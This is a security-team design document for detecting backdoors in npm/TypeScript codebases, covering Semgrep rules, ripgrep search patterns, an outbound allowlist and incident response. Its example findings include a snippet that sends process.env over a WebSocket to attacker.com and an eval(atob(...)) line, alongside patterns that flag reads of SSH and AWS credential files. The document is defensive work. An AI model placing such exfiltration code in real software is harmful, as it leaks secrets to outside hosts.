# Backdoor Reconnaissance - Phase 5

**Epic**: TSE-0002 - Security Hardening and Audit Framework
**Phase**: Phase 5 - Backdoor Reconnaissance
**Status**: Template Ready

---

## Overview

Phase 5 implements advanced threat detection to identify potential backdoors, malicious code, and supply chain attacks:
- **Extended SAST**: Advanced Semgrep rules for obfuscation and suspicious patterns
- **Grep Reconnaissance**: Pattern-based detection of backdoor indicators
- **Outbound Allowlist**: Runtime enforcement of approved external hosts

**Threat Model**:
- Compromised npm packages (malicious code injection)
- Obfuscated payloads (eval, base64, unicode)
- Hidden networking (data exfiltration, C2 beaconing)
- Supply chain attacks (dependency confusion, typosquatting)

---

## Detection Strategies

### 1. Obfuscation Markers

**What to detect**:
- `eval()`, `new Function()`, `Function()` - Code execution primitives
- `atob()`, `Buffer.from(..., 'base64')` - Base64 decoding
- Long base64 blobs (>100 chars) - Embedded payloads
- `while(!![])`style obfuscation - Obfuscator.io patterns

**Why suspicious**:
- Legitimate code rarely uses `eval` or `Function()`
- Base64 encoding hides payload from static analysis
- Obfuscation is a red flag in open-source dependencies

**Exceptions**:
- Build tools (webpack, babel) may use `Function()`
- Test fixtures may have base64-encoded data
- Add to allowlist if legitimate

---

### 2. Unicode and Homoglyphs

**What to detect**:
- Non-ASCII characters in source code (except comments/strings)
- Homoglyphs: `а` (Cyrillic) vs `a` (Latin), `о` vs `o`
- Invisible characters: zero-width space, right-to-left override

**Why suspicious**:
- Homoglyphs can hide malicious identifiers (e.g., `еval` vs `eval`)
- Invisible characters can hide code from code review
- Common in targeted supply chain attacks

**Example attack**:
```javascript
// Looks like: const API_KEY = "safe";
// Actually is: const АPI_KEY = "malicious";  // Cyrillic 'А'
```

---

### 3. Hidden Networking

**What to detect**:
- `require('http')`, `require('https')`, `require('net')` - Networking modules
- `new WebSocket()` - WebSocket connections
- `fetch()`, `axios()` without allowlist - Arbitrary outbound calls
- DNS exfiltration patterns

**Why suspicious**:
- Most application code should not require low-level networking
- WebSockets can establish C2 channels
- Unrestricted `fetch()` enables data exfiltration

**Legitimate uses**:
- API clients (e.g., Stripe SDK) - add to allowlist
- Service-to-service calls - document in architecture
- WebSocket for real-time features - allowlist specific hosts

---

### 4. Suspicious File Operations

**What to detect**:
- `fs.readFileSync()` on sensitive paths (`~/.ssh`, `~/.aws`)
- File writes to unusual locations (`/tmp`, system directories)
- File exfiltration patterns (read → encode → send)

**Why suspicious**:
- Credential harvesting (SSH keys, AWS credentials)
- Persistence mechanisms (cron jobs, startup scripts)
- Log tampering

---

## Tools and Workflows

### Extended Semgrep Rules

**Configuration**: `.semgrep/custom.yml` (extended by Phase 5)
**Workflow**: `.github/workflows/semgrep.yml` (already configured in Phase 2)

**Added Rules**:

1. **long-base64-blob** (WARNING)
   ```yaml
   pattern-regex: '[A-Za-z0-9+/]{100,}={0,2}'
   ```
   Detects long base64 strings (potential embedded payloads)

2. **unicode-homoglyphs-in-source** (INFO)
   ```yaml
   pattern-regex: '[а-яА-ЯёЁ]+'
   ```
   Detects Cyrillic characters (homoglyph attacks)

3. **disallow-external-axios-hosts** (WARNING)
   ```yaml
   pattern: |
     axios.$METHOD($URL)
   ```
   Requires allowlist check before axios calls

4. **node-networking-primitives** (WARNING)
   ```yaml
   pattern-either:
     - require('http')
     - require('https')
     - require('net')
     - require('dgram')
   ```
   Flags low-level networking (rare in application code)

5. **websocket-external-host** (WARNING)
   ```yaml
   pattern: new WebSocket($URL)
   ```
   Detects WebSocket connections (potential C2)

**Installation**:
Phase 5 extends `.semgrep/custom.yml` from Phase 2:
```bash
./claude/plugins/security-audit/commands/setup-phase.sh --phase backdoor-recon
```

---

### Grep Reconnaissance

**Workflow**: `.github/workflows/backdoor-recon.yml`
**Tool**: `ripgrep` (fast grep alternative)
**Schedule**: Push to main, PRs, weekly on Thursday at 04:00 UTC

**Search Patterns**:

**Obfuscation**:
```bash
rg -n "while\(!!\\[\\]\\)|\\bFunction\\(|\\beval\\(|atob\\(|Buffer\\.from.*base64" --type js --type ts
```

**Hidden Networking**:
```bash
rg -n 'require\\(.(http|https|net|dgram).\\)|new\\s+WebSocket\\(' --type js --type ts
```

**File Operations** (optional, not in default workflow):
```bash
rg -n 'readFileSync.*\\.ssh|readFileSync.*\\.aws|readFileSync.*credentials' --type js --type ts
```

**Workflow Output**:
```
src/malicious.ts:42: eval(atob(payload));
src/backdoor.ts:15: const ws = new WebSocket('ws://attacker.com');
```

**Result**:
- ✅ **Pass**: No findings
- ⚠️ **Warning**: Findings detected (continue-on-error: true, does not block PR)
- Findings logged to report for manual triage

---

### Outbound Allowlist Utility

**Purpose**: Runtime enforcement of approved external hosts
**Location**: `infrastructure/security/outbound-allowlist.ts`
**Tests**: `infrastructure/security/__tests__/outbound-allowlist.test.ts`

**How it works**:
1. Centralized allowlist of approved hostnames
2. `isAllowedUrl()` checks if URL is approved
3. `assertAllowedUrl()` throws if not approved
4. Wrap all `fetch()` and `axios()` calls

**Configuration**:
```typescript
// outbound-allowlist.ts
const knownSafeDomains = [
  'api.stripe.com',          // Payment gateway
  'api.coinbase.com',        // Market data
  'api.github.com',          // CI/CD integration
  'auth0.example.com',       // Authentication
];
```

**Usage**:
```typescript
import { assertAllowedUrl } from '@/infrastructure/security/outbound-allowlist';

async function fetchData(url: string) {
  assertAllowedUrl(url);  // Throws if not allowed
  const response = await fetch(url);
  return response.json();
}
```

**Installation**:
```bash
./claude/plugins/security-audit/commands/setup-phase.sh --phase backdoor-recon
```

**Files created**:
- `infrastructure/security/outbound-allowlist.ts`
- `infrastructure/security/__tests__/outbound-allowlist.test.ts`

**Testing**:
```bash
npm test infrastructure/security/outbound-allowlist.test.ts
```

---

## Triage Workflow

### 1. Review Findings

After workflow runs, review findings:
```bash
# View workflow logs
gh run list --workflow=backdoor-recon.yml
gh run view <run-id> --log
```

### 2. Classify Findings

For each finding, determine:
- **True Positive**: Malicious or suspicious code
- **False Positive**: Legitimate use case (e.g., build tool)
- **Unknown**: Requires deeper investigation

### 3. Remediation

**True Positive**:
1. **Isolate immediately**: Quarantine affected service
2. **Remove malicious code**: Delete or replace dependency
3. **Investigate scope**: Check Git history, logs, network traffic
4. **Incident response**: Notify security team, file incident report
5. **Rotate secrets**: Assume compromise, rotate all credentials

**False Positive**:
1. **Document justification**: Add comment explaining why legitimate
2. **Add to allowlist**: Suppress finding in Semgrep or grep workflow
   ```javascript
   // nosemgrep: long-base64-blob
   const CERTIFICATE = "MIIC..."; // X.509 certificate, not a payload
   ```
3. **Add to outbound allowlist**: If external call is legitimate
   ```typescript
   addAllowedHost('api.legitimate-service.com');
   ```

**Unknown**:
1. **Escalate to security team**
2. **Perform manual code review**
3. **Check package provenance**: npm audit signatures, Scorecard
4. **Scan with additional tools**: VirusTotal, hybrid-analysis.com

---

## Detection Examples

### Example 1: Obfuscated Payload

**Finding**:
```javascript
// src/malicious.js:42
eval(atob("Y29uc29sZS5sb2coJ2hhY2tlZCcp"));
```

**Analysis**:
```bash
# Decode base64
echo "Y29uc29sZS5sb2coJ2hhY2tlZCcp" | base64 -d
# Output: console.log('hacked')
```

**Verdict**: True positive (obfuscated code execution)
**Action**: Remove immediately, investigate how it entered codebase

---

### Example 2: Hidden WebSocket

**Finding**:
```javascript
// node_modules/compromised-package/index.js:10
const ws = new WebSocket('wss://attacker.com/c2');
ws.onopen = () => ws.send(JSON.stringify(process.env));
```

**Analysis**: Exfiltrates environment variables to external host
**Verdict**: True positive (data exfiltration)
**Action**:
1. Remove package immediately
2. Check package-lock.json for when introduced
3. Rotate all secrets
4. File incident report with npm security team

---

### Example 3: Legitimate Base64

**Finding**:
```javascript
// src/crypto.ts:100
const PUBLIC_KEY = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0..."; // 200 chars
```

**Analysis**: Base64-encoded RSA public key (legitimate)
**Verdict**: False positive
**Action**: Add suppression comment
```javascript
// nosemgrep: long-base64-blob
const PUBLIC_KEY = "..."; // RSA-2048 public key for signature verification
```

---

### Example 4: Undocumented Networking

**Finding**:
```javascript
// src/analytics.ts:50
fetch('https://analytics.unknown-domain.com/track', { method: 'POST', body: userData });
```

**Analysis**: Unknown analytics endpoint, not in allowlist
**Verdict**: Unknown (requires investigation)
**Action**:
1. Check if `analytics.unknown-domain.com` is legitimate
2. Review what data is sent in `userData`
3. If legitimate, add to allowlist and document
4. If not, remove and investigate source

---

## Allowlist Maintenance

### Adding Approved Hosts

**When to add**:
- ✅ Verified third-party APIs (Stripe, Coinbase, GitHub)
- ✅ Internal services (document in architecture)
- ✅ CDN/asset hosts (document purpose)

**How to add**:
```typescript
// infrastructure/security/outbound-allowlist.ts
const knownSafeDomains = [
  'api.newservice.com',  // PURPOSE: New feature X, approved by security
];
```

**Review process**:
1. Security team reviews and approves new domains
2. PR requires security team review
3. Document purpose and approval in code comments

### Periodic Review

**Quarterly audit**:
1. Review all allowed hosts
2. Remove hosts that are no longer used
3. Verify hosts are still under our control (domain expiration)
4. Check for DNS hijacking (resolve domains, verify IPs)

---

## Integration with Other Phases

Phase 5 complements other phases:
- **Phase 1 (SBOM)**: Identify which packages contain suspicious patterns
- **Phase 2 (SAST)**: Extended rules build on Phase 2 Semgrep config
- **Phase 3 (Secrets)**: Detect exfiltration of detected secrets
- **Phase 4 (Supply Chain)**: Cross-reference with Scorecard for package trust

**Combined workflow**:
1. Scorecard identifies low-trust packages
2. SBOM shows where those packages are used
3. Backdoor recon scans those packages for suspicious patterns
4. Secrets scanning ensures no credentials are exposed

---

## Compliance Mapping

| Compliance Standard | Requirement | Coverage |
|---------------------|-------------|----------|
| **NIST 800-53** | SI-3 - Malicious Code Protection | ✅ All tools |
| **NIST 800-161** | Supply Chain Risk Management | ✅ Backdoor detection |
| **SOC 2** | CC7.2 - System Monitoring | ✅ Recon workflow |
| **ISO 27001** | A.12.2.1 - Malware Controls | ✅ Obfuscation detection |
| **PCI-DSS** | 6.5.6 - Injection Flaws | ✅ Code execution detection |

---

## Advanced Techniques

### 1. Behavioral Analysis

Monitor runtime behavior:
```javascript
// infrastructure/security/behavior-monitor.ts
import { createHook, executionAsyncId } from 'async_hooks';

// Track network calls
const netCalls: Array<{asyncId: number, host: string}> = [];
createHook({
  init(asyncId, type, triggerAsyncId, resource) {
    if (type === 'TCPWRAP' || type === 'HTTPPARSER') {
      netCalls.push({ asyncId, host: resource.host });
    }
  },
}).enable();
```

### 2. Sandbox Testing

Test untrusted packages in sandbox:
```bash
# Use Docker to isolate
docker run --rm --network=none -v $(pwd):/app node:18 npm test

# Or use VM snapshot (forensics)
```

### 3. Provenance Verification

Check npm package signatures:
```bash
# Verify package signature (npm 9+)
npm audit signatures

# Check provenance attestation
npm view <package> --json | jq '.dist.attestations'
```

---

## Incident Response Plan

If backdoor detected:

### Phase 1: Containment (0-1 hour)
1. **Isolate affected services** (stop containers, disable endpoints)
2. **Block network egress** to suspicious IPs/domains
3. **Preserve evidence** (logs, container images, Git state)

### Phase 2: Investigation (1-4 hours)
1. **Identify patient zero**: Which commit/package introduced it?
2. **Scope the breach**: What data was accessed/exfiltrated?
3. **Check lateral movement**: Did it spread to other services?

### Phase 3: Eradication (4-24 hours)
1. **Remove malicious code** from all affected services
2. **Rebuild from clean base images**
3. **Rotate all secrets** (API keys, DB passwords, SSH keys)

### Phase 4: Recovery (1-3 days)
1. **Restore services** from clean state
2. **Verify integrity** (checksums, SBOM comparison)
3. **Monitor for reinfection**

### Phase 5: Lessons Learned (1 week)
1. **Root cause analysis**: How did it bypass defenses?
2. **Improve detection**: Add new rules to prevent recurrence
3. **Stakeholder communication**: Notify affected users if applicable

---

## Best Practices

1. ✅ **Review all new dependencies** before adding
2. ✅ **Pin dependency versions** (no ^, no ~)
3. ✅ **Monitor for suspicious activity** (network, file access)
4. ✅ **Use outbound allowlist** for all external calls
5. ✅ **Regularly audit allowlist** (quarterly)
6. ✅ **Educate developers** on supply chain risks
7. ❌ **Never ignore obfuscation** in dependencies
8. ❌ **Never disable backdoor detection** without security review

---

## Next Steps

After Phase 5 is deployed:
1. **Baseline scan**: Run recon workflow, triage all findings
2. **Configure allowlist**: Add all legitimate external hosts
3. **Educate team**: Share backdoor indicators document
4. **Monitor weekly**: Review workflow results every Friday
5. **Integrate with SIEM**: Send alerts to security monitoring

---

## References

- [OWASP Supply Chain Security](https://owasp.org/www-community/attacks/Supply_Chain_Attack)
- [npm Security Best Practices](https://docs.npmjs.com/security-best-practices)
- [Semgrep Rules](https://semgrep.dev/explore)
- [Backstabber's Knife Collection](https://github.com/kitplummer/bkc) - Malicious package analysis
- [Socket.dev Research](https://socket.dev/blog) - Supply chain attack research
- [NIST 800-161r1](https://csrc.nist.gov/publications/detail/sp/800-161/rev-1/final) - Supply Chain Risk Management

---

**Last Updated**: 2025-10-16
**Maintained By**: Security Team
